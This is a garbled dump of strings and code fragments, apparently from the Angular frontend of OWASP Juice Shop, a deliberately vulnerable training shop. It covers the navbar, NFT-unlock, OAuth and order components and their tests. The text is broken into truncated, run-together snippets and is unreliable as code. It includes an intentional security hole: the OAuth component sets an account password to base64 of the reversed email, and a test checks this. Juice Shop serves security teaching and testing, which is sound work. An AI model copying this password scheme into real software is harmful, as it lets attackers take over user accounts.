anslateSIDENAV_HINT{{applicationName}}searchControlsearch( ... .value)searchControl.valueuserMenu!isLoggedIn()isLoggedIn()goToProfilePagegoToProfilePage()isLogge ... nting()isAccounting()ordersSubMenuprivacySubMenulogoutlogout()menu{{ 'LANGUAGE_SEL_HINT' | translate }}'LANGUAGE_SEL_HINT''LANGUA ... anslateLANGUAGE_SEL_HINTchangeLanguagechangeL ... ge.key)language.key{{selectedLanguage === language}}selectedLanguageselecte ... anguage{{language.lang}}language.langlanguage.icons'fi fi-''fi fi-' + iconfi fi-'fas fa-thermometer-'gaugepercentage' confirmation'' error''fas fa ... error')'fas fa ... e.gauge'fas fa ... meter-'fas fa-thermometer-language.gauge(langua ... error')languag ...  error'languag ... ge > 70language.percentage confirmation error'privacy-security/privacy-policy'['priva ... olicy']'privac ... policy'privacy-security/privacy-policy'privacy-security/data-export'['priva ... xport']'privac ... export'privacy-security/data-exportgoToDataErasurePagegoToDat ... ePage()'privacy-security/change-password'['priva ... sword']'privac ... ssword'privacy-security/change-password'privacy-security/two-factor-authentication'['priva ... ation']'privac ... cation'privacy-security/two-factor-authentication'privacy-security/last-login-ip'['priva ... in-ip']'privac ... gin-ip'privacy-security/last-login-ipmat-toolbarhttp://www.w3.org/1999/htmlmat-toolbar-rowmat-menumat-menu-itemGo to wallet page{{"DIGITAL_WALLET" | translate}}"DIGITAL_WALLET""DIGITA ... anslateDIGITAL_WALLET/saved-payment-methodsGo to saved payment methods page{{"MY_PAYMENT_OPTIONS" | translate}}"MY_PAYMENT_OPTIONS""MY_PAY ... anslateMY_PAYMENT_OPTIONS/address/savedGo to saved address page{{"MY_SAVED_ADRESSES" | translate}}"MY_SAVED_ADRESSES""MY_SAV ... anslateMY_SAVED_ADRESSESGo to recycling page{{"NAV_RECYCLE" | translate}}"NAV_RECYCLE""NAV_RE ... anslateNAV_RECYCLEGo to order history page{{"LABEL_ORDER_HISTORY" | translate}}"LABEL_ORDER_HISTORY""LABEL_ ... ISTORY"LABEL_ORDER_HISTORY[routerLink]['privacy-security/last-login-ip']Go to last login ip page['privacy-security/two-factor-authentication']Go to two factor authentication page['privacy-security/change-password']Go to change password pagegoToDataErasurePage()Go to data subject page['privacy-security/data-export']Go to data export page['privacy-security/privacy-policy']Go to privacy policy pagechangeLanguage(language.key)let language of languageswidth: 240px;'fas fa-thermometer-' + language.gauge + (language.percentage > 70 ? ' confirmation' : ' error')display: inline-block; width: 200px; margin-left: 5px;{{language?.lang}}language?.langlet icon of language.icons[matMenuTriggerFor]height:48px; width: 48px;Language selection menu{{shortKeyLang}}shortKeyLangheight:48px;Show the shopping cartfa-layers-counter fa-layers-top-right fa-3x warn-notificationfont-size: 47px;{{itemTotal}}{{"TITLE_BASKET" | translate}}"TITLE_BASKET""TITLE_ ... anslateTITLE_BASKETLogoutnavbarLogoutButton{{"TITLE_LOGOUT" | translate }}"TITLE_LOGOUT"TITLE_LOGOUTShow Privacy and Security Menu{{ "PRIVACY_AND_SECURITY" | translate }}"PRIVACY_AND_SECURITY""PRIVAC ... anslate"PRIVAC ... CURITY"PRIVACY_AND_SECURITYShow Orders and Payment Menu{{ "ORDERS_AND_PAYMENT" | translate }}"ORDERS_AND_PAYMENT""ORDERS ... anslateORDERS_AND_PAYMENTisLoggedIn() && isAccounting()Go to accounting page{{"ACCOUNTING" | translate}}"ACCOUNTING""ACCOUN ... anslateACCOUNTINGGo to user profile{{userEmail}}Go to login pagenavbarLoginButton{{"TITLE_LOGIN" | translate }}"TITLE_LOGIN"TITLE_LOGIN{{"ACCOUNT" | translate}}"ACCOUNT"ACCOUNTmat-search-barfill-remaining-spaceheight:60px;Back to homepage[src]Open SidenavP:/My Drive/Git/juice-shop/frontend/src/app/navbar/navbar.component.spec.ts'./navbar.component''../Services/administration.service''NavbarComponent'administrationService'getApplicationVersion''getLoggedInState''should hold application version''x.y.z''vx.y.z''should show nothing on missing application version''should show nothing on error retrieving application version''should log errors directly to browser console''should use default application name if not customized''should use custom application name URL if configured''should set user email on page reload if user is authenticated''dummy@dummy.com''should set user email on getting logged in''should log errors directly to browser console when getting user failed''should show GitHub button by default''should hide GitHub ribbon if so configured''should log error while getting application configuration from backend API directly to browser console''should hide Score Board menu item when corresponding challenge was not solved yet'scoreBoardVisible'should show Score Board menu item if corresponding challenge has been solved''forwards to search result with search query as URL parameter''lemon juice''/search?q=lemon juice''forwards to search result with empty search criteria if no search query is present''should remove authentication token from localStorage''removeItem''should remove authentication token from cookies''should remove basket id from session storage''should remove basket item total from session storage''should set the login status to be false via UserService''should save the last login IP address''should forward to main page''should set selected a language''use''xx'./navbar.component/navbar../Services/administration.serviceon (str ... r)\r\n  }callback(str)let adm ... ce: anyadminis ... ce: anyadminis ... Servicelet loginGuardadminis ... sion'])jasmine ... sion'])['getAp ... rsion']'getApp ... ersion'adminis ... fined))adminis ... rnValueadminis ... ion.andadminis ... Version['whoAm ... ginIp']userSer ... (true))userSer ... ate.anduserSer ... InStatechallen ... find'])challen ... se }]))challen ... ind.andchallen ... ce.findof([{ s ... lse }])[{ solved: false }]{ solved: false }['remov ...  'put']loginGu ... (true))[Navbar ... ponent]transla ... ervice)should hold application versionadminis ... .y.z'))of('x.y.z')x.y.zexpect( ... x.y.z')expect( ... ersion)component.versionvx.y.zvxshould show nothing on missing application versionshould show nothing on error retrieving application versionadminis ... rror'))should log errors directly to browser console'should ... omized'should use default application name if not customizedexpect( ...  Shop')'should ... igured'should use custom application name URL if configuredof({ ap ... e' } }){ appli ... me' } }applica ... name' }{ name: 'name' }expect( ... 'name')'should ... icated'should set user email on page reload if user is authenticateduserSer ... om' }))of({ em ... com' }){ email ... .com' }email:  ... my.com'dummy@dummy.comdummy@dummyexpect( ... y.com')should set user email on getting logged inshould log errors directly to browser console when getting user failedshould show GitHub button by defaultcompone ... HubLinkshould hide GitHub ribbon if so configuredof({ ap ... se } }){ appli ... lse } }applica ... false }{ showG ... false }expect( ... (false)should log error while getting application configuration from backend API directly to browser console'should ... ed yet'should hide Score Board menu item when corresponding challenge was not solved yetexpect( ... isible)compone ... Visible'should ... solved'should show Score Board menu item if corresponding challenge has been solvedchallen ... ue }]))of([{ s ... rue }])[{ solved: true }]{ solved: true }'forwar ... ameter'forwards to search result with search query as URL parametercompone ... juice')component.searchlemon juiceexpect( ... uice'))encodeU ... juice')'/searc ...  juice'/search?q=lemon juice/searcq=lemon juice'forwar ... resent'forwards to search result with empty search criteria if no search query is presentcomponent.search('')expect( ... arch'))encodeURI('/search')should remove authentication token from localStoragespyOn(l ... eItem')component.logout()component.logoutexpect( ... veItem)'should ... ookies'should remove authentication token from cookiesexpect( ... remove)cookieService.removeshould remove basket id from session storagespyOn(s ... eItem')expect( ... ('bid')should remove basket item total from session storageexpect( ... Total')should set the login status to be false via UserServiceexpect( ... n.next)should save the last login IP addressexpect( ... oginIp)'should ... n page'should forward to main pageexpect( ... Be('/')'should ... nguage'should set selected a languagespyOn(t ... > lang)spyOn(t ... allFakespyOn(t ... e').andspyOn(t ...  'use')(lang: any) => langcompone ... e('xx')compone ... anguageexpect( ... h('xx')expect( ... ce.use)translateService.useP:/My Drive/Git/juice-shop/frontend/src/app/navbar/navbar.component.ts eslint-disable-next-line no-empty,@typescript-eslint/no-empty-function// esli ... unction'../Services/languages.service'faCommentfaInfoCirclefaLanguagefaMapMarkerfaRecyclefaSearchfaShoppingCartfaSignInAltfaSignOutAltfaThermometerEmptyfaThermometerFullfaThermometerHalffaThermometerQuarterfaThermometerThreeQuartersfaTrophyfaUserCirclefaUserSecretfaCommentsfaGithub'../roles''app-navbar''./navbar.component.html''./navbar.component.scss''placeholder'sidenavTogglelangService`v${'assets/public/images/'getUserDetailsgetScoreBoardStatus'scoreBoardChallenge'checkLanguagelangKeyshortKey`Language has been changed to ${'Force page reload''/profile''/dataerasure'../Services/languages.service/Services/languagesfaTherm ... uarters../roleslibrary ... erFull)class N ... \n  }\r\n}selecto ... navbar''./navb ... t.html'./navbar.component.html['./nav ... .scss']'./navb ... t.scss'./navbar.component.scsspublic  ... ny = []public  ... holder'public itemTotal = 0public  ... itter()this.getLanguages()this.getLanguagesthis.ba ... l = x))this.ba ... bscribethis.ba ... Total()this.ba ... emTotalx => (t ... al = x)(this.itemTotal = x)this.itemTotal = xthis.ad ... err) })this.ad ... rsion()this.ad ... Versionthis.ad ... Service(versio ... \r\n    }if (ver ...       }this.ve ... rsion}`this.version`v${version}`vconfig? ... n?.namethis.sh ... ubLinksthis.showGitHubLinkconfig. ... ubLinksconfig? ... n?.logothis.lo ...  + logo'assets ...  + logo'assets ... mages/'this.ge ... tails()this.getUserDetailsthis.userEmail = ''this.us ... State()this.us ... InState(isLogg ... \r\n    }if (isL ...       }this.ge ... tatus()this.ge ... dStatus(challe ...       }challen ... llenge''scoreB ... llenge'this.sc ...  = truethis.sc ... VisiblecheckLa ...  }\r\n  }const l ... guage')langKey ... guage')this.tr ... angKey)this.translate.usethis.se ... angKey)this.se ... anguagethis.la ... angKey)this.languages.findthis.languages(y: { k ... langKey{ key: string }y.key === langKeyy.keythis.sh ... hortKeythis.shortKeyLangthis.la ... hortKeythis.ch ... e('en')this.changeLanguagethis.se ... = 'en')this.la ... = 'en')(y: { k ... == 'en'y.key === 'en'search  ...  }\r\n  }if (val ... \r\n    }const q ... lue } }queryPa ... lue } }{ query ... lue } }queryPa ... value }{ q: value }q: valuethis.ng ... arams))async ( ... Params)await t ... Params)this.ro ... Params)getUser ... })\r\n  }this.us ... err) })isLogge ... ')\r\n  }return  ... token')logout  ... ))\r\n  }this.us ... ginIp()this.us ... LoginIp(user:  ... oop() }{ this.noop() }this.noop()this.noopsession ... Total')this.ng ... ['/']))async ( ... (['/'])await t ... (['/'])this.ro ... (['/'])['/']changeL ...  }\r\n  }const l ... angKey)languag ... angKey)language.shortKey`Langua ... .lang}`Languag ... ged to Language has been changed to Force page reloadgetScor ... })\r\n  }this.ch ... ard' })this.ch ... ce.find{ name: ... oard' }(challe ... \r\n    }this.sc ... .solvedchallenges[0].solvedchallenges[0]goToPro ... ')\r\n  }window. ... ofile')window. ... replaceenviron ... rofile'/profilegoToDat ... ')\r\n  }window. ... asure')environ ... rasure'/dataerasureonToggl ... ()\r\n  }this.si ... .emit()this.si ... le.emitthis.sidenavTogglenoop () { }getLang ... })\r\n  }this.la ... \n    })this.la ... bscribethis.la ... uages()this.la ... nguagesthis.langServicethis.languages = resthis.checkLanguage()this.checkLanguageisAccou ... ng\r\n  }return  ... ountingP:/My Drive/Git/juice-shop/frontend/src/app/nft-unlock/nft-unlock.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/nft-unlock!successResponsesubmitFormsubmitForm()20pxdetail-box mat-elevation-z6box-texthttps://testnets.opensea.io/assets/mumbai/0xf4817631372dca68a25a18eb7a0b36d54f3dbcf7/0box-titleowner-text{{'OWNED_BY' | translate}}'OWNED_BY''OWNED_ ... anslateOWNED_BYhttps://testnets.opensea.io/0x8343d2eb2B13A2495De435a1b15e85b98115Ce05mat-card-title(ngSubmit)btn btn-primaryform-groupwidth: 350pxassets/public/images/products/juicy_chatbot.jpgdetail-container offer-container warning-containerP:/My Drive/Git/juice-shop/frontend/src/app/nft-unlock/nft-unlock.component.ts'app-nft-unlock''./nft-unlock.component.html''./nft-unlock.component.scss'formSubmittedcheckChallengeStatusselecto ... unlock'app-nft-unlock'./nft- ... t.html'./nft-unlock.component.html/nft-unlock['./nft ... .scss']'./nft- ... t.scss'./nft-unlock.component.scssprivateKey: stringformSub ... = falseconstru ... ice) {}this.ch ... eStatuscheckCh ...  )\r\n  }this.ke ... ocked()this.ke ... nlockedsubmitF ...  )\r\n  }this.fo ...  = truethis.formSubmittedthis.ke ... ateKey)this.ke ... bmitKeythis.privateKeythis.su ...  = trueresponse.messageerror.error.messageP:/My Drive/Git/juice-shop/frontend/src/app/oauth/oauth.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/oauth{{"CONFIRM_LOGGED_IN_VIA_OAUTH2" | translate}}"CONFIRM_LOGGED_IN_VIA_OAUTH2""CONFIR ... anslate"CONFIR ... OAUTH2"CONFIRM_LOGGED_IN_VIA_OAUTH2{{"TITLE_LOGIN" | translate}}P:/My Drive/Git/juice-shop/frontend/src/app/oauth/oauth.component.spec.ts'./oauth.component''OAuthComponent''oauthLogin''?alt=json&access_token=TEST''removes authentication token and basket id on failed OAuth login attempt''will create regular user account with base64 encoded reversed email as password''test@test.com''bW9jLnRzZXRAdHNldA==''logs in user even after failed account creation as account might already have existed from previous OAuth login''Account already exists'oauth'removes authentication token and basket id on failed subsequent regular login attempt'./oauth.component/oauthuserSer ... save'])['oauth ... 'save']userSer ...  '' }))userSer ... thLoginof({ email: '' }){ email: '' }email: ''userService.save.anduserService.save[OAuthC ... ponent]{ provi ... } } } }snapsho ... ST' } }{ data: ... ST' } }data: { ... TEST' }{ param ... TEST' }params: ... n=TEST''?alt=j ... n=TEST'?alt=json&access_token=TESTremoves authentication token and basket id on failed OAuth login attemptit('wil ... \r\n  }))'will c ... ssword'will create regular user account with base64 encoded reversed email as passwordemail:  ... st.com'test@test.comtest@testexpect( ... A==' }){ email ... dA==' }passwor ... NldA==''bW9jLn ... NldA=='bW9jLnRzZXRAdHNldA==it('log ... \r\n  }))'logs i ...  login'logs in user even after failed account creation as account might already have existed from previous OAuth loginuserSer ... ts' }))throwEr ... sts' }){ error ... ists' }error:  ... exists''Accoun ... exists'Account already existsexpect( ... true })expect( ... .login){ email ...  true }oauth: trueremoves authentication token and basket id on failed subsequent regular login attemptcompone ... : '' })P:/My Drive/Git/juice-shop/frontend/src/app/oauth/oauth.component.ts'app-oauth''./oauth.component.html''./oauth.component.scss'parseRedirectUrlParamsaccess_tokeninvalidateSession'/login'splitted'='selecto ... -oauth'app-oauth'./oaut ... t.html'./oauth.component.html['./oau ... .scss']'./oaut ... t.scss'./oauth.component.scssthis.us ... _token)this.us ... thLoginthis.pa ... s_tokenthis.pa ... arams()this.pa ... lParamsparseRe ... lParams(profil ... \r\n    }const p ... in(''))passwor ... in(''))btoa(pr ... in(''))profile ... oin('')profile ... ().joinprofile ... verse()profile ... reverseprofile ... lit('')profile.email.splitprofile.emailthis.us ... ile) })this.us ... word })this.us ... ce.save{ email ... sword }email: profile.emailpasswor ... asswordthis.login(profile)() => { ... file) }{ this. ... file) }this.in ... (error)this.in ... Sessionthis.ng ... gin']))async ( ... ogin'])await t ... ogin'])this.ro ... ogin'])['/login']login ( ... })\r\n  }this.us ... true })invalid ... ')\r\n  }parseRe ... ms\r\n  }{\r\n     ... ms\r\n  }const h ... bstr(1)hash =  ... bstr(1)this.ro ... bstr(1)this.ro ... .substrthis.ro ... .paramsthis.ro ... ot.dataconst s ... it('&')splitte ... it('&')hash.split('&')hash.splitconst p ... ny = {}params: any = {}i < splitted.lengthsplitted.lengthconst p ... it('=')param:  ... it('=')splitte ... it('=')splitted[i].splitsplitted[i]const k ... aram[0]key: st ... aram[0]param[0]params[ ... aram[1]params[key]param[1]return paramsP:/My Drive/Git/juice-shop/frontend/src/app/order-completion/order-completion.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/order-completion{ id: this.orderId }id: this.orderIdthis.orderIdorderDe ... definedorderDe ... !== '?'orderDetails.eta{'numberdays': orderDetails.eta}{{ tweetText }}tweetText{{ 'PRINT_ORDER_CONFIRMATION' | translate }}'PRINT_ORDER_CONFIRMATION''PRINT_ ... anslate'PRINT_ ... MATION'PRINT_ORDER_CONFIRMATIONopenConfirmationPDFopenCon ... onPDF(){'bonus': orderDetails.bonus}mat-elevation-z0mat-elevation-z0 table-containermat-footer-row*matFooterRowDeftableColumnslet row; columns: tableColumns;total pricemat-footer-cell*matFooterCellDefprice-aligntrfont-weight: bold;td{{ orderDetails.totalPrice?.toFixed(2) }}orderDe ... ixed(2)orderDe ... toFixedorderDe ... alPrice{{ promotionalDiscount.toFixed(2) }}promotionalDiscountpromoti ... ixed(2)promoti ... toFixed{{ deliveryPrice.toFixed(2) }}deliveryPricedeliver ... ixed(2)deliver ... toFixed{{ orderDetails.itemTotal?.toFixed(2) }}orderDe ... emTotal{{ (element.total).toFixed(2) }}(elemen ... ixed(2)(elemen ... toFixed(element.total)element.total{{element.quantity}}element.quantity{{element.price}}openConfirmationPDF()https://twitter.com/intent/tweet?text={{ tweetText }}&hashtags=securityTweetheading-text{{"ORDER_SUMMARY" | translate}}"ORDER_SUMMARY""ORDER_ ... anslateORDER_SUMMARYorderDetails.eta !== '?' && orderDetails.eta !== undefined/track-result/new[queryParams]P:/My Drive/Git/juice-shop/frontend/src/app/order-completion/order-completion.component.spec.ts'./order-completion.component''../Services/track-order.service'convertToParamMapMockActivatedRoute'ad9b-96017e7cb1ae7bf9''OrderCompletionComponent'trackOrderService'should hold order details returned by backend API'2.88promotionalAmount'Apple Juice (1000ml)'10.88'should have bullet point list of products in tweet''I just purchased%0a- A%0a- B''should truncate tweet text if it exceeds 140 characters''AAAAAAAAAAAAAAAAAAAA''BBBBBBBBBBBBBBBBBBBB''CCCCCCCCCCCCCCCCCCCC''DDDDDDDDDDDDDDDDDDDD''EEEEEEEEEEEEEEEEEEEE''FFFFFFFFFFFFFFFFFFFF''I just purchased%0a- AAAAAAAAAAAAAAAAAAAA%0a- BBBBBBBBBBBBBBBBBBBB%0a- CCCCCCCCCCCCCCCCCCCC%0a- DDDDDDDDDDDDDDDDDDDD%0a- EEEEEEEEEEEEEEEEEEE...''should derive twitter handle from twitter URL if configured''https://twitter.com/bkimminich''I just purchased%0afrom @bkimminich''should append twitter handle to truncated tweet text''https://twitter.com/owasp_juiceshop''I just purchased%0a- AAAAAAAAAAAAAAAAAAAA%0a- BBBBBBBBBBBBBBBBBBBB%0a- CCCCCCCCCCCCCCCCCCCC%0a- DDDDDDDDDDDDDDDDDDDD%0a- EEEEEEEEEEEEEEEEEEE...%0afrom @owasp_juiceshop''should use configured URL as is if it is not a twitter URL''http://localhorst:42''I just purchased%0afrom http://localhorst:42''should use configured application name as a fallback for missing twitter URL''I just purchased%0afrom OWASP Juice Shop''should log error while getting order details from backend API directly to browser console'./order-completion.component/order-completion../Services/track-order.serviceexport  ...  }))\r\n}class M ...  }))\r\n}public  ... \r\n  }))of(conv ... \r\n  }))convert ... '\r\n  }){\r\n     ... 9'\r\n  }id: 'ad ... ae7bf9''ad9b-9 ... ae7bf9'ad9b-96017e7cb1ae7bf9'OrderC ... ponent'trackOr ... ce: anylet act ... te: anyactivatedRoute: anylet bas ... ce: anybasketService: anytrackOr ... find'])trackOr ...  }] }))trackOr ... rnValuetrackOr ... ind.andtrackOr ... ce.findof({ da ... ] }] }){ data: ... [] }] }data: [ ... : [] }][{ products: [] }]{ products: [] }products: []activat ... Route()new Moc ... Route()[OrderC ... ponent]{ provi ... Route }useValu ... edRoute'should ... nd API'should hold order details returned by backend APIof({ da ... ' }] }){ data: ... 5' }] }data: [ ...  '5' }][{ tota ...  '5' }]{ total ... : '5' }totalPrice: 2.88promoti ... unt: 10deliveryPrice: 2addressId: 1paymentId: 1product ... s: 0 }][{ quan ... s: 0 }]{ quant ... us: 0 }Apple Juice (1000ml)1000mlprice: 1.99total: 1.99bonus: 0price: 0.89total: 0.89eta: '5'expect( ... scount)compone ... iscountexpect( ... yPrice)compone ... ryPricecompone ... dressIdexpect( ... mentId)compone ... ymentIdexpect( ... e(2.88)expect( ... ed(2)))parseFl ... xed(2))(compon ... ixed(2)(compon ... toFixed(compon ... lPrice)compone ... alPriceexpect( ... (10.88)(compon ... mTotal)compone ... emTotalexpect( ... Be('5')expect( ... ls.eta)compone ... ils.etacompone ... s.bonusexpect( ... 00ml)')compone ... ucts[0]expect( ... omace')compone ... 1].namecompone ... ucts[1]'should ...  tweet'should have bullet point list of products in tweet{ data: ... }] }] }data: [ ... ' }] }][{ prod ... ' }] }]{ produ ... B' }] }product ...  'B' }][{ name ...  'B' }]{ name: 'A' }name: 'A'{ name: 'B' }name: 'B'configu ... f({ }))of({ })expect( ... 0a- B')expect( ... etText)component.tweetText'I just ... %0a- B'I just purchased%0a- A%0a- Bshould truncate tweet text if it exceeds 140 characters{ produ ... F' }] }product ... FFF' }][{ name ... FFF' }]{ name: ... AAAA' }name: ' ... AAAAAA''AAAAAA ... AAAAAA'AAAAAAAAAAAAAAAAAAAA{ name: ... BBBB' }name: ' ... BBBBBB''BBBBBB ... BBBBBB'BBBBBBBBBBBBBBBBBBBB{ name: ... CCCC' }name: ' ... CCCCCC''CCCCCC ... CCCCCC'CCCCCCCCCCCCCCCCCCCC{ name: ... DDDD' }name: ' ... DDDDDD''DDDDDD ... DDDDDD'DDDDDDDDDDDDDDDDDDDD{ name: ... EEEE' }name: ' ... EEEEEE''EEEEEE ... EEEEEE'EEEEEEEEEEEEEEEEEEEE{ name: ... FFFF' }name: ' ... FFFFFF''FFFFFF ... FFFFFF'FFFFFFFFFFFFFFFFFFFFexpect( ... EE...')'I just ... EEE...'I just purchased%0a- AAAAAAAAAAAAAAAAAAAA%0a- BBBBBBBBBBBBBBBBBBBB%0a- CCCCCCCCCCCCCCCCCCCC%0a- DDDDDDDDDDDDDDDDDDDD%0a- EEEEEEEEEEEEEEEEEEE...I just purchased%0a- AAAAAAAAAAAAAAAAAAAA%0a- BBBBBBBBBBBBBBBBBBBB%0a- CCCCCCCCCCCCCCCCCCCC%0a- DDDDDDDDDDDDDDDDDDDD%0a- EEEEEEEEEEEEEEEEEEEshould derive twitter handle from twitter URL if configuredapplica ... ch' } }{ socia ... ch' } }social: ... nich' }{ twitt ... nich' }twitter ... minich''https: ... minich'https://twitter.com/bkimminichhttps://twittercom/bkimminichexpect( ... inich')'I just ... minich'I just purchased%0afrom @bkimminich'should ... t text'should append twitter handle to truncated tweet textapplica ... op' } }{ socia ... op' } }social: ... shop' }{ twitt ... shop' }com/owasp_juiceshopexpect( ... eshop')'I just ... ceshop'I just purchased%0a- AAAAAAAAAAAAAAAAAAAA%0a- BBBBBBBBBBBBBBBBBBBB%0a- CCCCCCCCCCCCCCCCCCCC%0a- DDDDDDDDDDDDDDDDDDDD%0a- EEEEEEEEEEEEEEEEEEE...%0afrom @owasp_juiceshop%0afrom @owasp_juiceshop'should ... er URL'should use configured URL as is if it is not a twitter URLapplica ... 42' } }{ socia ... 42' } }social: ... t:42' }{ twitt ... t:42' }twitter ... rst:42''http:/ ... rst:42'http://localhorst:42expect( ... st:42')'I just ... rst:42'I just purchased%0afrom http://localhorst:42should use configured application name as a fallback for missing twitter URL{ appli ... l } } }applica ... ull } }{ name: ... ull } }social: ...  null }{ twitterUrl: null }'I just ... e Shop'I just purchased%0afrom OWASP Juice Shopshould log error while getting order details from backend API directly to browser consoletrackOr ... rror'))P:/My Drive/Git/juice-shop/frontend/src/app/order-completion/order-completion.component.ts'app-order-completion''./order-completion.component.html''./order-completion.component.scss''product''price''quantity''total price''I just purchased''id'results`%0a- ${truncateTweet'%0afrom ''https://twitter.com/'redirectUrl}/ftp/order_${}.pdf`tweetshowDots}${library ... witter)selecto ... letion''app-or ... letion'app-order-completion'./orde ... t.html'./order-completion.component.html['./ord ... .scss']'./orde ... t.scss'./order-completion.component.scsspublic  ... price']['produ ... price']public  ... ce: 0 }{ totalPrice: 0 }totalPrice: 0public  ... ice = 0public  ... unt = 0public  ... chased'I just purchasedthis.ac ... err) })this.or ... t('id')paramMap.get('id')this.tr ... err) })this.tr ... rderId)this.tr ... ce.findthis.pr ... nt) : 0this.pr ... iscountresults ... nt) : 0results ... lAmountresults.data[0]results.dataparseFl ... Amount)this.de ... ce) : 0this.deliveryPriceresults ... ce) : 0results ... ryPriceparseFl ... yPrice)this.or ... dressIdthis.orderDetailsresults ... dressIdthis.or ... ymentIdresults ... ymentIdthis.or ... alPriceresults ... alPricethis.or ... ryPricethis.or ... emTotalresults ... iscountthis.or ...  || '?'this.or ... ils.etaresults ...  || '?'results.data[0].etathis.or ... roductsresults ... roductsthis.or ... ].bonusthis.or ... s.bonusresults ... ].bonusthis.da ... oducts)new Mat ... oducts)this.tw ... .name}`this.tweetText`%0a- $ ... .name}`%0a- this.tw ... etText)this.tr ... etText)this.truncateTweet(config ...       }this.tw ... afrom '%0afrom this.tw ... ', '@')config. ... ', '@')config. ... replace'https: ... r.com/'https://twitter.com/com/this.tw ... on.nameopenCon ... ')\r\n  }const r ... d}.pdf`redirec ... d}.pdf``${this ... d}.pdf`this.ba ... tServer/ftp/order_.pdfwindow. ... blank')truncat ... }`\r\n  }(tweet: ... }`\r\n  }{\r\n     ... }`\r\n  }if (!tw ... rn null!tweetconst s ... xLengthshowDot ... xLengthtweet.l ... xLengthtweet.lengthreturn  ...  : ''}``${twee ...  : ''}`tweet.s ... Length)tweet.substringshowDot ... .' : ''P:/My Drive/Git/juice-shop/frontend/src/app/order-history/order-history.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/order-history!emptyState; else emptyResult!order.delivered{{ 'LABEL_TRACK_ORDER' | translate }}'LABEL_TRACK_ORDER'LABEL_TRACK_ORDERtrackOrdertrackOr ... rderId)openCon ... rderId)order.products{{ 'WRITE_REVIEW' | translate }}'WRITE_REVIEW'WRITE_REVIEWshowDetailshowDet ... ent.id)card1mat-card-cvrmat-elevation-z6 emptyStatemat-card-contentnoResultText No results foundimg-responsive noResultassets/public/images/products/no-results.pnglet order of orderstable-container mat-elevation-z4 custom-slateshowDetail(element.id)5%openConfirmationPDF(order.orderId)Track Your OrdertrackOrder(order.orderId){{ order.bonus }}order.bonus{{ order.totalPrice.toFixed(2) }}order.t ... ixed(2)order.t ... toFixed{{ order.orderId }}P:/My Drive/Git/juice-shop/frontend/src/app/order-history/order-history.component.spec.ts'./order-history.component''../Models/product.model''../product-details/product-details.component''should make emptyState true and hold no orders when get Order History gives empty response'emptyState'should make emptyState false when get Order History gives non empty response''should log error from get order history API call directly to browser console''should log error from get product API call directly to browser console''should open a modal dialog when showDetail is called''C''500px''max-content'./order-history.component../Models/product.model/Models/product'../pro ... ponent'../product-details/product-details.componentproduct ... 'get'])orderHi ... 'get'])orderHi ... get.andorderHi ... ice.get[OrderH ... ponent]'should ... sponse'should make emptyState true and hold no orders when get Order History gives empty responseexpect( ... yState)component.emptyStateexpect( ... orders)component.ordersshould make emptyState false when get Order History gives non empty responseorderHi ... ue }]))of([{ o ... rue }])[{ orde ... true }]{ order ...  true }orderId: 'a'totalPrice: 1products: [{}][{}]should log error from get order history API call directly to browser consoleshould log error from get product API call directly to browser consolecomponent.showDetailshould open a modal dialog when showDetail is calledproduct ... oduct))of({ id ... roduct){ id: 4 ... Product{ id: 4 ... e: 10 }description: 'B'image: 'C'price: 10compone ... ail(42)width: '500px'500pxheight: ... ontent'max-contentproduct ... ts: 1 }{ id: 4 ... ts: 1 }points: 1P:/My Drive/Git/juice-shop/frontend/src/app/order-history/order-history.component.tsStrippedProduct'app-order-history''./order-history.component.html''./order-history.component.scss''review''/track-result'quantity: numbertotal: numberbonus: numberproduct ... roduct>MatTabl ... roduct>selecto ... istory'app-order-history./order-history.component.html./order-history.component.scsspublic  ... eview']['produ ... eview']this.or ... e.get()this.or ... ice.getorders  ... verse()orders.reverse()orders.reverseif (ord ...       }orders.length === 0orders.lengththis.em ...  = truethis.emptyStatethis.em ... = falseconst p ... [] = []product ... [] = []StrippedProduct[]products.pushid: product.idtotal: product.totalproduct.totalthis.orders.pushthis.ordersbonus: order.bonusproduct ... oducts)showDet ... })\r\n  }this.pr ... get(id)this.pr ... ice.getconst e ...       }element ...       }points: ... e / 10)product.price / 10this.di ...      })productData: elementtrackOr ... ))\r\n  }['/track-result']/track-resultqueryPa ...       }id: orderIdP:/My Drive/Git/juice-shop/frontend/src/app/order-summary/order-summary.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/order-summarypaymentMethodaddress ... tMethodpaymentMethod !== 'wallet'; else walletPaymentgetMessage($event)placeOrderplaceOrder()bonus-pointsbtn btn-payComplete your purchasemat-footer-cell price{{ (itemTotal + deliveryPrice - promotionalDiscount)?.toFixed(2)
            }}(itemTo ... ixed(2)(itemTo ... toFixed(itemTo ... scount)itemTot ... iscountitemTot ... ryPricemat-footer-cell labelmat-cell pricemat-cell label{{ itemTotal?.toFixed(2) }}itemTot ... ixed(2)itemTotal?.toFixed70%[totalPrice]{{paymentMethod?.fullName}}payment ... ullName{{paymentMethod?.cardNum}}payment ... cardNumP:/My Drive/Git/juice-shop/frontend/src/app/order-summary/order-summary.component.spec.ts'./order-summary.component''../Services/payment.service''../order-completion/order-completion.component''OrderSummaryComponent'paymentService'checkout''updateNumberOfCartItems''isDeluxe''order-completion''should log errors from payment service directly to browser console''paymentId''should hold delivery price on ngOnInit''should hold card on ngOnInit when paymentId is initialized to an id''************1234''should be wallet on ngOnInit when paymentId is initialized to wallet''should store prices on calling getMessage''couponDiscount''70''should remove session details from session storage'orderConfirmationId'1234123412341234''couponDetails'./order-summary.component/order-summary../Services/payment.service'../ord ... ponent'../order-completion/order-completion.component'OrderS ... ponent'let pay ... ce: anypaymentService: anybasketS ... tems'])jasmine ... tems'])['check ... Items']'update ... tItems'basketS ...  [] }))basketS ... rnValuebasketS ... ind.andbasketService.findof({ Products: [] }){ Products: [] }Products: []basketS ... of({}))basketS ... out.andbasketS ... heckoutbasketS ... ems.andbasketS ... rtItemspayment ... ById'])payment ... of([]))payment ... rnValuepayment ... yId.andpayment ... getByIddeliver ... ById'])deliver ...  10 }))deliver ... yId.anddeliver ... getByIdof({ price: 10 }){ price: 10 }deluxeG ... luxe'])jasmine ... luxe'])['isDeluxe']deluxeG ... (false)deluxeG ... rnValuedeluxeG ... uxe.anddeluxeGuard.isDeluxe[OrderS ... ponent]path: ' ... letion'order-completionshould log errors from payment service directly to browser consolesession ... ', '1')payment ... 